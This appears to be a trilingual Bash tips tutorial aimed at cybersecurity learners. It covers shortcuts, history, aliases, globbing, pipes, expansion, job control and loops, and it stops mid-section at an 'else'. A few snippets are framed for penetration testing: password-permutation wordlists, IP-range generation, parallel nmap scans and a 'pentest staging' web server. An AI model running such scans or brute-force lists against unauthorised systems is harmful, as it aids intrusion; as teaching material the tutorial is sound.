# 🐚 Bash Tips & Tricks — Shortcuts & Productivity

> **LearnCybersecurity** | Shell Fundamentals Series  
> 📅 Last Updated: 2026 | 👤 Author: kodoktheGr3at

---
<img width="1920" height="1080" alt="Desain tanpa judul (1)" src="https://github.com/user-attachments/assets/585dfc2d-5330-4522-a947-4f6a6e2f326c" />
<img width="2248" height="1260" alt="image" src="https://github.com/user-attachments/assets/55ef2804-e2d6-4051-a231-e8ae6c1414b8" />



## 📖 Daftar Isi / Table of Contents / 目次

| # | Topic | Bahasa Indonesia | English | 日本語 |
|---|-------|-----------------|---------|--------|
| 1 | Overview | Apa itu Bash & mengapa penting | What is Bash & why it matters | Bashとは何か、なぜ重要か |
| 2 | Keyboard Shortcuts | Shortcut navigasi & editing | Navigation & editing shortcuts | ナビゲーションと編集ショートカット |
| 3 | History Tricks | Trik riwayat perintah | Command history tricks | コマンド履歴のテクニック |
| 4 | Aliases & Functions | Alias & fungsi kustom | Custom aliases & functions | カスタムエイリアスと関数 |
| 5 | Globbing & Wildcards | Pencocokan pola file | File pattern matching | ファイルパターンマッチング |
| 6 | Redirection & Pipes | Pengalihan & pipeline | Redirection & pipelines | リダイレクトとパイプライン |
| 7 | Variables & Expansion | Variabel & ekspansi | Variables & expansion | 変数と展開 |
| 8 | Job Control | Kontrol proses background | Background process control | バックグラウンドプロセス制御 |
| 9 | Loops & Conditionals | Perulangan & kondisi | Loops & conditionals | ループと条件分岐 |
| 10 | Text Processing | Pemrosesan teks | Text processing one-liners | テキスト処理ワンライナー |
| 11 | Navigation Tricks | Trik navigasi direktori | Directory navigation tricks | ディレクトリナビゲーション |
| 12 | Scripting Best Practices | Praktik terbaik scripting | Scripting best practices | スクリプトのベストプラクティス |
| 13 | Debugging | Debug script bash | Bash script debugging | Bashスクリプトのデバッグ |
| 14 | Security Note | Bash untuk pentest & CTF | Bash for pentest & CTF | ペンテストとCTFのためのBash |
| 15 | Workflow | Contoh workflow praktis | Practical workflow examples | 実践的なワークフロー例 |

---

## 1. 🏢 Overview — What Is Bash

### 🇮🇩 Bahasa Indonesia
**Bash (Bourne Again SHell)** adalah **shell command-line** paling umum digunakan di sistem Unix/Linux dan macOS. Bash bertindak sebagai **interpreter** antara pengguna dan kernel sistem operasi, memungkinkan eksekusi perintah, scripting, dan otomasi tugas.

Menguasai shortcut dan trik Bash sangat **menghemat waktu**, terutama saat:
- Navigasi cepat di terminal tanpa mouse
- Mengulang perintah kompleks tanpa mengetik ulang
- Membuat pipeline untuk memproses data dengan cepat
- Menulis script otomasi untuk tugas berulang

**Mengapa penting untuk cybersecurity:**
- **Efisiensi recon** → menjalankan banyak tool berurutan via pipe & loop
- **Otomasi exploit** → scripting payload, brute force, parsing output
- **Log analysis** → grep, awk, sed untuk mencari indikator serangan
- **CTF & pentest** → one-liner untuk privilege escalation enumeration
- **Living off the land** → bash murni sering tersedia tanpa tool tambahan

### 🇬🇧 English
**Bash (Bourne Again SHell)** is the most commonly used **command-line shell** on Unix/Linux and macOS systems. Bash acts as an **interpreter** between the user and the operating system kernel, enabling command execution, scripting, and task automation.

Mastering Bash shortcuts and tricks **saves significant time**, especially when:
- Navigating quickly in the terminal without a mouse
- Repeating complex commands without retyping
- Building pipelines to process data quickly
- Writing automation scripts for repetitive tasks

**Why it matters for cybersecurity:**
- **Recon efficiency** → chaining multiple tools via pipes & loops
- **Exploit automation** → scripting payloads, brute force, output parsing
- **Log analysis** → grep, awk, sed to hunt for attack indicators
- **CTF & pentesting** → one-liners for privilege escalation enumeration
- **Living off the land** → pure bash is often available without extra tools

### 🇯🇵 日本語
**Bash（Bourne Again SHell）**はUnix/LinuxとmacOSシステムで最も一般的に使われる**コマンドラインシェル**です。Bashはユーザーとオペレーティングシステムカーネルの間の**インタープリター**として機能し、コマンド実行、スクリプト作成、タスクの自動化を可能にします。

Bashのショートカットとテクニックを習得すると、特に以下の場面で**大幅に時間を節約**できます：
- マウスなしでターミナルを素早くナビゲートする
- 複雑なコマンドを再入力せずに繰り返す
- データを素早く処理するパイプラインを構築する
- 繰り返しタスクの自動化スクリプトを書く

**サイバーセキュリティにとって重要な理由：**
- **偵察の効率化** → パイプとループで複数のツールを連結する
- **エクスプロイトの自動化** → ペイロード、ブルートフォース、出力解析のスクリプト化
- **ログ分析** → grep、awk、sedで攻撃の痕跡を探す
- **CTFとペンテスト** → 権限昇格列挙のためのワンライナー
- **Living off the land** → 追加ツールなしで純粋なbashが利用可能なことが多い

---

## 2. ⌨️ Keyboard Shortcuts — Navigation & Editing

### 🇮🇩 Bahasa Indonesia
Bash menggunakan **Readline** sebagai library editing baris perintah, yang menyediakan shortcut bergaya Emacs secara default. Menghafal shortcut ini menghilangkan kebutuhan untuk menekan tombol panah berulang kali.

### 🇬🇧 English
Bash uses **Readline** as its command-line editing library, which provides Emacs-style shortcuts by default. Memorizing these shortcuts eliminates the need to repeatedly press arrow keys.

### 🇯🇵 日本語
Bashはコマンドライン編集ライブラリとして**Readline**を使っており、デフォルトでEmacsスタイルのショートカットを提供しています。これらのショートカットを覚えることで、矢印キーを繰り返し押す必要がなくなります。

```bash
# ── CURSOR MOVEMENT ──────────────────────────────────────────────
Ctrl + A        # Move cursor to beginning of line
Ctrl + E        # Move cursor to end of line
Ctrl + F        # Move forward one character (same as →)
Ctrl + B        # Move backward one character (same as ←)
Alt  + F        # Move forward one word
Alt  + B        # Move backward one word
Ctrl + XX       # Jump between start of line and current cursor position

# ── EDITING / DELETING ───────────────────────────────────────────
Ctrl + U        # Delete from cursor to beginning of line
Ctrl + K        # Delete from cursor to end of line
Ctrl + W        # Delete one word before cursor
Alt  + D        # Delete one word after cursor
Ctrl + D        # Delete character under cursor (or exit shell if line empty)
Ctrl + H        # Delete character before cursor (same as Backspace)
Ctrl + T        # Transpose (swap) two characters before cursor
Alt  + T        # Transpose two words before cursor
Alt  + U        # Uppercase word from cursor to end of word
Alt  + L        # Lowercase word from cursor to end of word
Alt  + C        # Capitalize word from cursor

# ── PASTE / YANK ──────────────────────────────────────────────────
Ctrl + Y        # Paste (yank) last killed text
Alt  + Y        # Cycle through kill-ring after yank

# ── SCREEN CONTROL ────────────────────────────────────────────────
Ctrl + L        # Clear screen (same as `clear`, keeps current line)
Ctrl + S        # Stop terminal output (freeze)
Ctrl + Q        # Resume terminal output (unfreeze)

# ── PROCESS CONTROL ───────────────────────────────────────────────
Ctrl + C        # Kill (SIGINT) current foreground process
Ctrl + Z        # Suspend (SIGTSTP) current process → send to background
Ctrl + D        # Send EOF (end of input / logout if shell)

# ── COMPLETION ────────────────────────────────────────────────────
Tab             # Auto-complete command/file/path
Tab Tab         # Show all possible completions
Alt  + ?        # List possible completions (same as Tab Tab)
Alt  + *        # Insert all possible completions inline
```

### 🔑 Most-Used Shortcuts Cheat Table

| Shortcut | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|----------|-----------|-------------|---------|
| `Ctrl+A` | Ke awal baris | Go to start of line | 行頭へ移動 |
| `Ctrl+E` | Ke akhir baris | Go to end of line | 行末へ移動 |
| `Ctrl+U` | Hapus ke awal baris | Delete to start of line | 行頭まで削除 |
| `Ctrl+K` | Hapus ke akhir baris | Delete to end of line | 行末まで削除 |
| `Ctrl+W` | Hapus satu kata | Delete one word | 1単語削除 |
| `Ctrl+R` | Cari riwayat (reverse) | Reverse search history | 履歴を逆検索 |
| `Ctrl+L` | Bersihkan layar | Clear screen | 画面をクリア |
| `Ctrl+C` | Hentikan proses | Kill process | プロセスを停止 |
| `Ctrl+Z` | Suspend proses | Suspend process | プロセスを一時停止 |
| `Ctrl+D` | EOF / logout | EOF / logout | EOF/ログアウト |
| `Tab` | Auto-complete | Auto-complete | 自動補完 |

---

## 3. 🕓 History Tricks — Command History

### 🇮🇩 Bahasa Indonesia
Bash menyimpan riwayat perintah yang dijalankan, biasanya di `~/.bash_history`. Memanfaatkan riwayat ini secara efektif dapat menghemat banyak waktu mengetik ulang perintah panjang.

### 🇬🇧 English
Bash stores a history of executed commands, typically in `~/.bash_history`. Effectively leveraging this history can save significant time retyping long commands.

### 🇯🇵 日本語
Bashは実行されたコマンドの履歴を保存します。通常は`~/.bash_history`に保存されます。この履歴を効果的に活用することで、長いコマンドを再入力する時間を大幅に節約できます。

```bash
# ── BASIC HISTORY ────────────────────────────────────────────────
history                 # show full command history
history 20               # show last 20 commands
history -c                # clear in-memory history
history -d 100             # delete entry at line 100

# ── SEARCHING HISTORY ────────────────────────────────────────────
Ctrl + R                  # incremental reverse search
# Type part of a command, press Ctrl+R again to cycle older matches
# Press Enter to run, → or Esc to edit before running

Ctrl + S                  # incremental forward search (if not frozen)
Ctrl + G                  # cancel search

# ── BANG (!) HISTORY EXPANSION ───────────────────────────────────
!!                        # repeat last command
!!:p                      # print last command without running it
!n                        # run command number n from history
!-n                       # run nth-from-last command
!string                   # run most recent command starting with "string"
!?string                  # run most recent command containing "string"
!$                        # last argument of previous command
!^                        # first argument of previous command
!*                        # all arguments of previous command
^old^new                  # repeat last command, replacing "old" with "new"

# ── PRACTICAL EXAMPLES ───────────────────────────────────────────
$ mkdir /tmp/project
$ cd !$                   # cd /tmp/project (reuses last argument)

$ apt install nmap
$ sudo !!                 # sudo apt install nmap (reruns with sudo)

$ ls /var/www/html
$ cat !$/index.php        # cat /var/www/html/index.php

# ── ALT + . (DOT) ────────────────────────────────────────────────
Alt + .                   # insert last argument of previous command
                            # press repeatedly to cycle through older args

# ── HISTORY ENVIRONMENT CONTROL ──────────────────────────────────
export HISTSIZE=10000              # commands kept in memory
export HISTFILESIZE=20000          # commands kept in history file
export HISTCONTROL=ignoredups:erasedups  # avoid duplicate entries
export HISTIGNORE="ls:cd:pwd:exit" # don't log these common commands
export HISTTIMEFORMAT="%F %T "     # show timestamp in `history`

# ── SAVE HISTORY IMMEDIATELY (multi-terminal sync) ───────────────
shopt -s histappend
PROMPT_COMMAND="history -a; history -c; history -r; $PROMPT_COMMAND"

# ── SEARCH HISTORY FILE DIRECTLY ─────────────────────────────────
grep "ssh" ~/.bash_history
history | grep "nmap"
```

| Trick | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|-------|-----------|-------------|---------|
| `Ctrl+R` | Cari riwayat interaktif | Interactive history search | インタラクティブ履歴検索 |
| `!!` | Ulangi perintah terakhir | Repeat last command | 最後のコマンドを再実行 |
| `!$` | Argumen terakhir | Last argument | 最後の引数 |
| `sudo !!` | Ulangi dengan sudo | Rerun with sudo | sudoで再実行 |
| `^old^new` | Ganti kata & ulangi | Substitute word & repeat | 単語を置換して再実行 |
| `Alt+.` | Sisipkan argumen terakhir | Insert last argument | 最後の引数を挿入 |

---

## 4. 🏷️ Aliases & Functions — Custom Shortcuts

### 🇮🇩 Bahasa Indonesia
**Alias** memungkinkan Anda membuat singkatan untuk perintah panjang atau yang sering digunakan. **Function** lebih powerful karena bisa menerima argumen dan logika kondisional. Keduanya biasanya didefinisikan di `~/.bashrc`.

### 🇬🇧 English
**Aliases** allow you to create shortcuts for long or frequently used commands. **Functions** are more powerful since they can accept arguments and conditional logic. Both are typically defined in `~/.bashrc`.

### 🇯🇵 日本語
**エイリアス**は長いコマンドや頻繁に使うコマンドの短縮形を作成できます。**関数**は引数や条件ロジックを受け取れるためより強力です。どちらも通常`~/.bashrc`で定義します。

```bash
# ── DEFINING ALIASES ─────────────────────────────────────────────
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias grep='grep --color=auto'
alias df='df -h'
alias du='du -h'
alias free='free -h'
alias ports='netstat -tulnp'
alias myip='curl -s ifconfig.me'
alias path='echo -e ${PATH//:/\\n}'
alias h='history'
alias c='clear'
alias e='exit'
alias reload='source ~/.bashrc'

# ── SAFETY ALIASES (prevent mistakes) ────────────────────────────
alias rm='rm -i'           # confirm before delete
alias cp='cp -i'           # confirm before overwrite
alias mv='mv -i'           # confirm before overwrite
alias chown='chown --preserve-root'
alias chmod='chmod --preserve-root'

# ── GIT ALIASES ───────────────────────────────────────────────────
alias gs='git status'
alias ga='git add'
alias gc='git commit -m'
alias gp='git push'
alias gl='git log --oneline --graph --decorate --all'
alias gd='git diff'

# ── VIEW EXISTING ALIASES ─────────────────────────────────────────
alias                      # list all defined aliases
type ll                    # check what an alias/command resolves to
unalias ll                 # remove an alias temporarily

# ── FUNCTIONS (more powerful than aliases) ────────────────────────

# Make directory and cd into it in one command
mkcd() {
    mkdir -p "$1" && cd "$1"
}

# Extract any archive type automatically
extract() {
    if [ -f "$1" ]; then
        case "$1" in
            *.tar.bz2) tar xjf "$1"   ;;
            *.tar.gz)  tar xzf "$1"   ;;
            *.tar.xz)  tar xJf "$1"   ;;
            *.bz2)     bunzip2 "$1"   ;;
            *.rar)     unrar x "$1"  ;;
            *.gz)      gunzip "$1"   ;;
            *.tar)     tar xf "$1"   ;;
            *.zip)     unzip "$1"    ;;
            *.7z)      7z x "$1"     ;;
            *)         echo "'$1' cannot be extracted" ;;
        esac
    else
        echo "'$1' is not a valid file"
    fi
}

# Quick HTTP server in current directory (pentest staging!)
serve() {
    local port="${1:-8000}"
    python3 -m http.server "$port"
}

# Find process by name and show PID
psg() {
    ps aux | grep -i "$1" | grep -v grep
}

# Quick backup of a file with timestamp
bak() {
    cp "$1" "$1.bak.$(date +%Y%m%d_%H%M%S)"
}

# cd into the directory of a file
cdf() {
    cd "$(dirname "$1")"
}

# Make persistent — add to ~/.bashrc
echo "alias ll='ls -alF'" >> ~/.bashrc
source ~/.bashrc
```

| Alias/Function | 🇮🇩 Manfaat | 🇬🇧 Benefit | 🇯🇵 利点 |
|----------------|-----------|-----------|---------|
| `alias ll='ls -alF'` | Hemat ketikan harian | Saves daily typing | 日常のタイピングを節約 |
| `alias rm='rm -i'` | Cegah hapus tidak sengaja | Prevents accidental deletion | 誤削除を防止 |
| `mkcd()` | Buat & masuk folder sekaligus | Create & enter folder at once | フォルダ作成と移動を一度に |
| `extract()` | Ekstrak semua jenis arsip | Extract any archive type | あらゆる圧縮形式を解凍 |
| `serve()` | Web server instan untuk pentest | Instant web server for pentest | ペンテスト用の即席Webサーバー |

---

## 5. 🔍 Globbing & Wildcards — Pattern Matching

### 🇮🇩 Bahasa Indonesia
**Globbing** adalah mekanisme bash untuk mencocokkan nama file berdasarkan pola, tanpa perlu regex penuh. Sangat berguna untuk operasi massal pada banyak file sekaligus.

### 🇬🇧 English
**Globbing** is bash's mechanism for matching filenames based on patterns, without needing full regex. Extremely useful for bulk operations on multiple files at once.

### 🇯🇵 日本語
**グロビング**は完全な正規表現を必要とせずにパターンに基づいてファイル名をマッチングするbashの仕組みです。複数ファイルへの一括操作に非常に便利です。

```bash
# ── BASIC WILDCARDS ──────────────────────────────────────────────
*           # matches any number of characters (including zero)
?           # matches exactly one character
[abc]       # matches one character: a, b, or c
[a-z]       # matches one character in range a to z
[^abc]      # matches any character EXCEPT a, b, c
[!abc]      # same as above (negation)

# ── EXAMPLES ──────────────────────────────────────────────────────
ls *.txt              # all .txt files
ls file?.log          # file1.log, file2.log, fileA.log (not file10.log)
ls [abc]*.sh          # files starting with a, b, or c, ending .sh
ls report_[0-9].csv   # report_0.csv ... report_9.csv
ls *.{jpg,png,gif}    # brace expansion — multiple extensions
rm -- -filename       # delete file starting with a dash safely

# ── EXTENDED GLOBBING (extglob) ──────────────────────────────────
shopt -s extglob

ls !(*.txt)            # everything EXCEPT .txt files
ls @(*.jpg|*.png)      # files matching EITHER pattern
ls +(*.log)            # one or more matches
ls *(*.tmp)            # zero or more matches

# ── GLOBSTAR — recursive matching ─────────────────────────────────
shopt -s globstar

ls **/*.php             # all .php files in ALL subdirectories recursively
find . -name "*.php"    # equivalent using find

# ── BRACE EXPANSION (not technically globbing, but related) ───────
echo file{1,2,3}.txt           # file1.txt file2.txt file3.txt
echo {a..e}                    # a b c d e
echo {1..10}                   # 1 2 3 4 5 6 7 8 9 10
echo {01..10}                  # 01 02 03 ... 10 (zero-padded)
echo {10..1}                   # 10 9 8 7 6 5 4 3 2 1 (reverse)
mkdir -p project/{src,bin,docs,test}   # create 4 dirs at once
touch file{1..5}.txt            # creates file1.txt ... file5.txt
cp file.txt{,.bak}              # cp file.txt file.txt.bak (clever trick!)

# ── PENTEST-RELEVANT EXAMPLES ──────────────────────────────────────
# Generate wordlist permutations
echo {admin,root,test}{1,2,3,!,@}
# admin1 admin2 admin3 admin! admin@ root1 root2 ... etc

# Generate IP range quickly
echo 192.168.1.{1..254}

# Generate port ranges for testing
for port in {1..1024}; do echo $port; done
```

| Pattern | 🇮🇩 Arti | 🇬🇧 Meaning | 🇯🇵 意味 |
|---------|---------|-----------|---------|
| `*` | Karakter apa saja (0+) | Any characters (0+) | 任意の文字（0個以上） |
| `?` | Satu karakter | Single character | 1文字 |
| `[abc]` | Salah satu karakter | One of these chars | いずれかの文字 |
| `{a,b,c}` | Ekspansi brace | Brace expansion | ブレース展開 |
| `{1..10}` | Rentang angka | Number range | 数値範囲 |
| `**` | Rekursif (perlu globstar) | Recursive (needs globstar) | 再帰的（globstar必要） |

---

## 6. 🔀 Redirection & Pipes — I/O Control

### 🇮🇩 Bahasa Indonesia
**Redirection** mengarahkan input/output dari/ke file, sedangkan **pipe (`|`)** menghubungkan output satu perintah sebagai input perintah berikutnya. Ini adalah inti dari filosofi Unix: "lakukan satu hal dengan baik, lalu sambungkan."

### 🇬🇧 English
**Redirection** directs input/output from/to files, while a **pipe (`|`)** connects the output of one command as the input to the next. This is the core of the Unix philosophy: "do one thing well, then chain them."

### 🇯🇵 日本語
**リダイレクト**は入出力をファイルとの間でやり取りし、**パイプ（`|`）**はあるコマンドの出力を次のコマンドの入力として接続します。これはUnix哲学の核心です：「一つのことをうまくやり、それらをつなげる」。

```bash
# ── BASIC REDIRECTION ────────────────────────────────────────────
command > file.txt          # redirect stdout to file (overwrite)
command >> file.txt         # redirect stdout to file (append)
command < file.txt          # use file as stdin
command 2> error.log        # redirect stderr only
command 2>> error.log       # append stderr
command &> all_output.log   # redirect BOTH stdout and stderr (overwrite)
command &>> all_output.log  # redirect BOTH (append)
command > out.log 2>&1      # equivalent older-style syntax
command 2>&1 > out.log      # WRONG ORDER — stderr still goes to terminal!

command > /dev/null          # discard stdout (silence output)
command 2> /dev/null         # discard stderr only
command &> /dev/null         # discard everything (silent mode)

# ── HEREDOC & HERESTRING ─────────────────────────────────────────
cat << EOF
Multi-line
text block
goes here
EOF

cat << 'EOF'                  # quoted EOF disables variable expansion
$HOME will print literally
EOF

mysql -u root -p << EOF
SHOW DATABASES;
EOF

grep "pattern" <<< "$variable"   # herestring — feed variable as input

# ── PIPES ──────────────────────────────────────────────────────────
ps aux | grep nginx                    # filter process list
cat access.log | grep "404" | wc -l    # count 404 errors
ls -la | sort -k5 -n                   # sort files by size
history | grep ssh                     # search command history
curl -s example.com | grep -o 'href="[^"]*"'  # extract links

# ── TEE — split output to file AND screen ────────────────────────
command | tee output.txt               # show on screen + save to file
command | tee -a output.txt            # append instead of overwrite
command | tee file1.txt file2.txt      # save to multiple files
nmap target | tee scan.txt | grep open # save AND filter simultaneously

# ── PROCESS SUBSTITUTION ─────────────────────────────────────────
diff <(sort file1.txt) <(sort file2.txt)   # compare sorted output of two commands
diff <(ls dir1) <(ls dir2)                  # compare directory contents

# ── XARGS — build commands from piped input ──────────────────────
cat urls.txt | xargs -I {} curl -O {}              # download each URL
find . -name "*.tmp" | xargs rm                     # delete all matches
echo "file1 file2 file3" | xargs touch              # create multiple files
cat ips.txt | xargs -P 10 -I {} ping -c 1 {}        # parallel execution (10 at once)
cat hosts.txt | xargs -n1 -P 20 nmap -p 80 --open   # parallel port scan

# ── CHAINING OPERATORS ────────────────────────────────────────────
cmd1 && cmd2     # run cmd2 ONLY if cmd1 succeeds (exit code 0)
cmd1 || cmd2     # run cmd2 ONLY if cmd1 fails (exit code != 0)
cmd1 ; cmd2      # run cmd2 regardless of cmd1's result
cmd1 &           # run cmd1 in background
( cmd1 ; cmd2 )  # run in a subshell
{ cmd1 ; cmd2 ; } # run in current shell (note required spaces & trailing ;)
```

| Operator | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|----------|-----------|-------------|---------|
| `>` | Tulis ulang ke file | Overwrite to file | ファイルに上書き |
| `>>` | Tambahkan ke file | Append to file | ファイルに追記 |
| `\|` | Pipe output ke perintah lain | Pipe output to next command | 出力を次のコマンドへ |
| `2>&1` | Gabung stderr ke stdout | Merge stderr into stdout | stderrをstdoutに結合 |
| `tee` | Tampilkan + simpan sekaligus | Display + save simultaneously | 表示と保存を同時に |
| `&&` | Jalankan jika sukses | Run if previous succeeded | 成功したら実行 |
| `\|\|` | Jalankan jika gagal | Run if previous failed | 失敗したら実行 |

---

## 7. 💲 Variables & Expansion — Parameter Tricks

### 🇮🇩 Bahasa Indonesia
Bash menyediakan **parameter expansion** yang sangat powerful untuk memanipulasi variabel tanpa perlu memanggil program eksternal seperti `sed` atau `awk`. Ini membuat script lebih cepat dan portabel.

### 🇬🇧 English
Bash provides powerful **parameter expansion** to manipulate variables without needing external programs like `sed` or `awk`. This makes scripts faster and more portable.

### 🇯🇵 日本語
Bashは`sed`や`awk`のような外部プログラムを呼び出さずに変数を操作できる強力な**パラメータ展開**を提供します。これによりスクリプトが高速かつ移植性が高くなります。

```bash
# ── BASIC VARIABLE ASSIGNMENT ────────────────────────────────────
name="Claude"
echo "$name"
echo "${name}"               # braces recommended for clarity/safety

# ── DEFAULT VALUES ────────────────────────────────────────────────
echo "${var:-default}"       # use "default" if var is unset/empty (doesn't set var)
echo "${var:=default}"       # use "default" AND set var to it
echo "${var:+alternate}"     # use "alternate" only if var IS set
echo "${var:?error message}" # exit with error message if var is unset

# ── STRING LENGTH ─────────────────────────────────────────────────
str="Hello World"
echo "${#str}"                # 11

# ── SUBSTRING EXTRACTION ──────────────────────────────────────────
echo "${str:0:5}"             # "Hello" (start:length)
echo "${str:6}"                # "World" (from position 6 to end)
echo "${str: -5}"              # "World" (last 5 chars, note the space before -5)

# ── STRING REPLACEMENT ────────────────────────────────────────────
echo "${str/World/Bash}"       # replace FIRST match: "Hello Bash"
echo "${str//o/0}"              # replace ALL matches: "Hell0 W0rld"
echo "${str/#Hello/Hi}"         # replace only if match is at START
echo "${str/%World/Bash}"       # replace only if match is at END

# ── REMOVE PATTERN (great for paths/extensions) ───────────────────
file="/home/user/archive.tar.gz"
echo "${file##*/}"              # "archive.tar.gz"  (remove longest match from front → basename)
echo "${file#*/}"                # "home/user/archive.tar.gz" (remove shortest match from front)
echo "${file%.*}"                # "/home/user/archive.tar" (remove shortest match from end)
echo "${file%%.*}"               # "/home/user/archive" (remove longest match from end)
echo "${file%/*}"                # "/home/user" (remove filename → dirname)

# ── CASE CONVERSION (Bash 4+) ──────────────────────────────────────
echo "${str^^}"                 # "HELLO WORLD" (uppercase all)
echo "${str,,}"                 # "hello world" (lowercase all)
echo "${str^}"                  # "Hello World" (uppercase first char)
echo "${str,}"                  # "hello World" (lowercase first char)

# ── ARRAYS ────────────────────────────────────────────────────────
arr=("apple" "banana" "cherry")
echo "${arr[0]}"                # "apple"
echo "${arr[@]}"                # all elements: apple banana cherry
echo "${#arr[@]}"                # array length: 3
arr+=("date")                   # append element
unset arr[1]                    # remove element at index 1
for item in "${arr[@]}"; do echo "$item"; done

# ── ASSOCIATIVE ARRAYS (Bash 4+) ──────────────────────────────────
declare -A user
user[name]="alice"
user[role]="admin"
echo "${user[name]}"
for key in "${!user[@]}"; do echo "$key: ${user[$key]}"; done

# ── COMMAND SUBSTITUTION ────────────────────────────────────────────
files=$(ls)                     # modern syntax
files=`ls`                      # legacy syntax (avoid, no nesting)
today=$(date +%Y-%m-%d)
count=$(find . -name "*.log" | wc -l)

# ── ARITHMETIC EXPANSION ─────────────────────────────────────────
echo $((5 + 3))                 # 8
echo $((10 / 3))                # 3 (integer division)
echo $((10 % 3))                # 1 (modulo)
echo $((2 ** 10))               # 1024 (power)
x=5; ((x++))                    # increment x
x=5; ((x+=10))                  # x is now 15

# ── SPECIAL VARIABLES ─────────────────────────────────────────────
$0       # script/shell name
$1 $2... # positional arguments
$#       # number of arguments
$@       # all arguments as separate words
$*       # all arguments as single word
$?       # exit status of last command
$$       # PID of current shell
$!       # PID of last background process
$_       # last argument of previous command
```

| Expansion | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|-----------|-----------|-------------|---------|
| `${var:-default}` | Nilai default jika kosong | Default if unset | 未設定時のデフォルト |
| `${var##*/}` | Ambil basename path | Get basename of path | パスのbasenameを取得 |
| `${var%.*}` | Hapus ekstensi file | Strip file extension | 拡張子を削除 |
| `${var^^}` | Ubah ke huruf besar | Convert to uppercase | 大文字に変換 |
| `${#var}` | Panjang string | String length | 文字列の長さ |
| `$(command)` | Substitusi perintah | Command substitution | コマンド置換 |
| `$?` | Status keluar terakhir | Last exit status | 最後の終了ステータス |

---

## 8. ⚙️ Job Control — Background & Foreground

### 🇮🇩 Bahasa Indonesia
**Job control** memungkinkan Anda menjalankan beberapa proses sekaligus dalam satu sesi shell, beralih antara foreground dan background, serta mengelola proses jangka panjang seperti server atau scan.

### 🇬🇧 English
**Job control** allows you to run multiple processes simultaneously within a single shell session, switch between foreground and background, and manage long-running processes like servers or scans.

### 🇯🇵 日本語
**ジョブ制御**により、1つのシェルセッション内で複数のプロセスを同時に実行し、フォアグラウンドとバックグラウンドを切り替え、サーバーやスキャンのような長時間実行されるプロセスを管理できます。

```bash
# ── RUNNING IN BACKGROUND ────────────────────────────────────────
long_command &              # start in background, returns immediately
nmap -p- target.com &       # run scan in background
nohup long_command &        # run immune to hangup signal (survives logout)
nohup long_command > out.log 2>&1 &   # background + logging + hangup-proof
disown                      # detach last background job from shell entirely

# ── LISTING & MANAGING JOBS ───────────────────────────────────────
jobs                        # list all jobs in current shell
jobs -l                     # list jobs with PIDs

fg                          # bring most recent background job to foreground
fg %1                       # bring job number 1 to foreground
bg                          # resume most recent suspended job in background
bg %2                       # resume job 2 in background

Ctrl + Z                    # suspend current foreground process
Ctrl + C                    # kill current foreground process

# ── KILLING PROCESSES ────────────────────────────────────────────
kill PID                    # send SIGTERM (graceful termination)
kill -9 PID                 # send SIGKILL (force kill, can't be caught)
kill -15 PID                # explicit SIGTERM
kill %1                     # kill job number 1
killall process_name        # kill all processes matching name
pkill -f "pattern"          # kill processes matching command-line pattern
pkill -u username           # kill all processes owned by user

# ── PROCESS MONITORING ────────────────────────────────────────────
ps aux                      # list all running processes
ps aux | grep nginx          # find specific process
top                          # interactive real-time process monitor
htop                         # improved interactive monitor (if installed)
pgrep -fl python             # find PIDs matching pattern, with full command

# ── RUN MULTIPLE COMMANDS IN PARALLEL ──────────────────────────────
command1 & command2 & command3 &
wait                         # wait for ALL background jobs to finish
wait $!                      # wait for the LAST background job's PID

# ── SCREEN / TMUX — Persistent sessions (survive disconnect) ──────
screen -S mysession          # start new named screen session
screen -r mysession           # reattach to existing session
screen -ls                    # list sessions
# Ctrl+A, D                   # detach from screen

tmux new -s mysession         # start new named tmux session
tmux attach -t mysession      # reattach to session
tmux ls                       # list sessions
# Ctrl+B, D                   # detach from tmux

# ── TIMING COMMANDS ───────────────────────────────────────────────
time command                  # measure execution time
timeout 10 command            # kill command if it runs over 10 seconds
timeout 5m long_scan.sh       # kill if runs over 5 minutes
```

| Command | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|---------|-----------|-------------|---------|
| `cmd &` | Jalankan di background | Run in background | バックグラウンドで実行 |
| `nohup cmd &` | Tahan dari hangup | Survive shell logout | ログアウトでも継続 |
| `jobs` | Lihat daftar job | List background jobs | バックグラウンドジョブ一覧 |
| `fg` / `bg` | Pindah foreground/background | Switch foreground/background | フォア/バック切り替え |
| `kill -9 PID` | Paksa hentikan proses | Force-kill process | プロセスを強制終了 |
| `tmux` / `screen` | Sesi persisten | Persistent session | 永続セッション |

---

## 9. 🔁 Loops & Conditionals — Control Structures

### 🇮🇩 Bahasa Indonesia
Loop dan kondisi memungkinkan otomasi tugas berulang dan pengambilan keputusan dalam script. Sangat berguna untuk memproses banyak target/file sekaligus, terutama dalam konteks pentest atau administrasi sistem.

### 🇬🇧 English
Loops and conditionals enable automation of repetitive tasks and decision-making in scripts. Extremely useful for processing many targets/files at once, especially in pentesting or system administration contexts.

### 🇯🇵 日本語
ループと条件分岐は、繰り返しタスクの自動化とスクリプト内での意思決定を可能にします。多くのターゲット/ファイルを一度に処理するのに非常に便利で、特にペンテストやシステム管理の文脈で役立ちます。

```bash
# ── FOR LOOPS ──────────────────────────────────────────────────────
for i in 1 2 3 4 5; do echo "$i"; done
for i in {1..10}; do echo "$i"; done
for i in {1..20..2}; do echo "$i"; done    # step by 2

for file in *.txt; do echo "$file"; done
for file in /var/log/*.log; do echo "Processing $file"; done

for ((i=0; i<10; i++)); do echo "$i"; done  # C-style loop

# Loop through file lines
while IFS= read -r line; do
    echo "Line: $line"
done < input.txt

# Loop through command output
for ip in $(cat ips.txt); do
    ping -c 1 -W 1 "$ip" &>/dev/null && echo "$ip is UP"
done

# ── WHILE LOOPS ────────────────────────────────────────────────────
counter=0
while [ "$counter" -lt 5 ]; do
    echo "Counter: $counter"
    ((counter++))
done

# Infinite loop with break condition
while true; do
    read -p "Continue? (y/n): " answer
    [ "$answer" = "n" ] && break
done

# ── UNTIL LOOPS ───────────────────────────────────────────────────
counter=0
until [ "$counter" -ge 5 ]; do
    echo "$counter"
    ((counter++))
done

# ── IF / ELIF / ELSE ──────────────────────────────────────────────
if [ "$1" = "start" ]; then
    echo "Starting..."
elif [ "$1" = "stop" ]; then
    echo "Stopping..."
else
